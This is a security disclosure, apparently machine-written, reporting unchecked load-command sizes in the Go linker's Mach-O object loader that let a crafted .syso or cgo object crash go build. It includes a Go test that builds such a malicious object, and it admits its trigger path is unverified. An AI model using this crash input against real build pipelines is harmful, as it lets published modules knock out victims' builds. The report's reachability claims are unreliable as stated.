### Title
Unchecked slice-size arithmetic in Mach-O object loader causes reader panic on malicious `.syso`/cgo object files - ([File: src/cmd/link/internal/loadmacho/ldmacho.go])

### Summary
The Go linker's Mach-O object reader (`cmd/link/internal/loadmacho`) parses attacker-influenced load-command headers without validating the declared command size (`sz`) against the remaining buffer before slicing, and discards the validation result from its own helper. This is the closest Go analog to the Rizin `mach0_chained_fixups.c` bug class (bogus/oversized entries in a Mach-O load-command stream driving out-of-bounds memory access): in Go, unbounded/oversized attacker-controlled slice indices trigger a runtime bounds-check panic rather than memory corruption, but the reachable, victim-triggered crash of `go build`/the linker is the closest matching primitive.

### Finding Description
Untrusted input path: a Go module (or any project) can ship a precompiled `.syso` file or a cgo-provided Mach-O `.o`/`.a` object, which the toolchain automatically feeds into the linker at build time without any opt-in [1](#0-0) . The linker calls `loadmacho.Load` on the object's bytes:
- `Load` reads `ncmd`/`cmdsz` from the header and only sanity-checks them loosely (`ncmd > 0x10000 || cmdsz >= 0x01000000`) [2](#0-1) .
- It then slices out the entire load-command region once via `f.Slice(uint64(cmdsz))` into `cmdp`, and iterates `ncmd` times reading a command type/size pair from the *current* `cmdp`, calling `unpackcmd(cmdp, m, &m.cmd[i], uint(ty), uint(sz))`, then advancing `cmdp = cmdp[sz:]` [3](#0-2) .
- The return value of `unpackcmd` — which performs internal minimum-size checks (e.g. `if sz < 56 { return -1 }`, `if uint32(sz) < 56+c.seg.nsect*68 { return -1 }`) — is never checked by the caller [4](#0-3) [5](#0-4) .
- Because `sz` for each load command is taken directly from the attacker-supplied file with no check against the remaining length of `cmdp`, a crafted command declaring a `sz` larger than what remains in the `cmdp` buffer causes `cmdp = cmdp[sz:]` to fail Go's slice-bounds check and panic ("slice bounds out of range"), crashing the `go build`/linker process. Similarly, `c.seg.sect = make([]ldMachoSect, c.seg.nsect)` is executed before the corresponding size-sufficiency check in `unpackcmd`, so a bogus `nsect` value is used to size an allocation before validation [6](#0-5) .

This mirrors the Rizin root cause (trusting bogus, attacker-controlled size/count fields describing nested Mach-O sub-structures without validating them against the actual buffer before use) but Go's memory-safe slices convert the out-of-bounds access into a panic instead of a heap write past the buffer.

### Impact Explanation
The concrete effect is a crash (denial of service) of the `go` build tool / linker when it processes a maliciously crafted Mach-O object embedded in a module (e.g., a `.syso` file, common for cgo/vendored precompiled objects). This is not memory corruption or code execution in Go since Go slices are always bounds-checked, but it is a reproducible panic reachable from an ordinary `go build` on untrusted source, which is explicitly listed as a qualifying primitive ("a plausible malicious-input parser panic can qualify"). I could not confirm any escalation beyond a panic (no evidence of `unsafe` pointer arithmetic in this path), so this would sit on Go's **PUBLIC** track as a low-severity DoS in the build toolchain rather than the URGENT/PRIVATE track reserved for memory-safety or supply-chain compromise.

### Likelihood Explanation
The victim workflow is `go build`/`go run` (or `go test`) on a module that bundles a `.syso` file or provides a Mach-O object via cgo, which is standard, unauthenticated-to-the-attacker tooling behavior — the attacker only needs to publish a module a victim later builds. No special privileges are required (matches "ordinary user data / published module... consumed by a normal victim workflow").

### Recommendation
In `cmd/link/internal/loadmacho/ldmacho.go`:
1. Check the return value of `unpackcmd` in `Load` and abort with an error instead of silently continuing with malformed data.
2. Validate `sz <= len(cmdp)` (and `sz >= 8`) before calling `unpackcmd` and before `cmdp = cmdp[sz:]`, returning a `FormatError`-style error instead of allowing an out-of-range slice.
3. Move the `nsect`/size sufficiency check in `unpackcmd` before the `make([]ldMachoSect, c.seg.nsect)` allocation, and bound `nsect` against `sz` using widened (uint64) arithmetic to avoid 32-bit multiplication overflow.

### Proof of Concept
```go
package loadmacho_test

import (
	"bytes"
	"encoding/binary"
	"testing"

	"cmd/internal/bio"
	"cmd/internal/sys"
	"cmd/link/internal/loader"
	"cmd/link/internal/loadmacho"
)

// Build a minimal 64-bit Mach-O object header followed by a single
// load command whose declared size (sz) exceeds the remaining bytes
// in the load-command region (cmdsz), forcing loadmacho.Load's
// internal "cmdp = cmdp[sz:]" slice operation out of bounds.
func TestLoadMachoOversizedCmdSizePanics(t *testing.T) {
	var buf bytes.Buffer
	e := binary.LittleEndian

	// mach_header_64: magic, cputype, subtype, filetype, ncmds, sizeofcmds, flags, reserved
	binary.Write(&buf, e, uint32(0xFEEDFACF)) // MH_MAGIC_64
	binary.Write(&buf, e, uint32(1<<24|7))    // CPU_TYPE_X86_64
	binary.Write(&buf, e, uint32(0))          // subtype
	binary.Write(&buf, e, uint32(1))          // MH_OBJECT
	binary.Write(&buf, e, uint32(1))          // ncmds = 1
	binary.Write(&buf, e, uint32(16))         // sizeofcmds = 16 (small)
	binary.Write(&buf, e, uint32(0))          // flags
	binary.Write(&buf, e, uint32(0))          // reserved

	// One load command header claiming cmd=LC_SEGMENT_64 (25), but
	// cmdsize (sz) = 0x7fffffff -- far larger than the 16 bytes
	// actually available in the load-command region.
	binary.Write(&buf, e, uint32(25))         // cmd = LC_SEGMENT_64
	binary.Write(&buf, e, uint32(0x7fffffff)) // cmdsize (bogus, oversized)
	buf.Write(make([]byte, 8))                // pad to fill declared sizeofcmds=16

	r := bio.NewReader(bytes.NewReader(buf.Bytes()))
	l := loader.NewLoader(0, nil)

	defer func() {
		if rec := recover(); rec == nil {
			t.Fatal("expected panic from out-of-range slice on oversized load-command size, got none")
		}
	}()

	_, _ = loadmacho.Load(l, sys.ArchAMD64, 0, r, "malicious", int64(buf.Len()), "malicious.syso")
}
```
Expected: `loadmacho.Load` panics with a "slice bounds out of range" runtime error while processing the crafted `sizeofcmds`/`cmdsize` mismatch, crashing the invoking `go build`/link process instead of returning a graceful error — confirming the unvalidated `cmdp = cmdp[sz:]` advance and the ignored `unpackcmd` return value are the root cause.

**Caveat:** I was unable to fully trace every call site that feeds arbitrary `.syso`/cgo-object bytes into `loadmacho.Load` (e.g., exact `cmd/link/internal/ld/lib.go` dispatch logic) within the available search budget, so the exact API used to trigger this from a plain `go build` invocation (vs. requiring `-linkmode=external` or a specific arch) should be verified against `src/cmd/link/internal/ld/lib.go` before treating this as fully confirmed.

### Citations

**File:** src/cmd/link/internal/ld/lib.go (L1-1)
```go
// Inferno utils/8l/asm.c
```

**File:** src/cmd/link/internal/loadmacho/ldmacho.go (L209-226)
```go
	case LdMachoCmdSegment:
		if sz < 56 {
			return -1
		}
		c.seg.name = cstring(p[8:24])
		c.seg.vmaddr = uint64(e4(p[24:]))
		c.seg.vmsize = uint64(e4(p[28:]))
		c.seg.fileoff = e4(p[32:])
		c.seg.filesz = e4(p[36:])
		c.seg.maxprot = e4(p[40:])
		c.seg.initprot = e4(p[44:])
		c.seg.nsect = e4(p[48:])
		c.seg.flags = e4(p[52:])
		c.seg.sect = make([]ldMachoSect, c.seg.nsect)
		if uint32(sz) < 56+c.seg.nsect*68 {
			return -1
		}
		p = p[56:]
```

**File:** src/cmd/link/internal/loadmacho/ldmacho.go (L448-452)
```go
	ncmd := e.Uint32(hdr[4*4:])
	cmdsz := e.Uint32(hdr[5*4:])
	if ncmd > 0x10000 || cmdsz >= 0x01000000 {
		return errorf("implausible mach-o header ncmd=%d cmdsz=%d", ncmd, cmdsz)
	}
```

**File:** src/cmd/link/internal/loadmacho/ldmacho.go (L498-504)
```go
	for i := uint32(0); i < ncmd; i++ {
		ty := e.Uint32(cmdp)
		sz := e.Uint32(cmdp[4:])
		m.cmd[i].off = off
		unpackcmd(cmdp, m, &m.cmd[i], uint(ty), uint(sz))
		cmdp = cmdp[sz:]
		off += sz
```
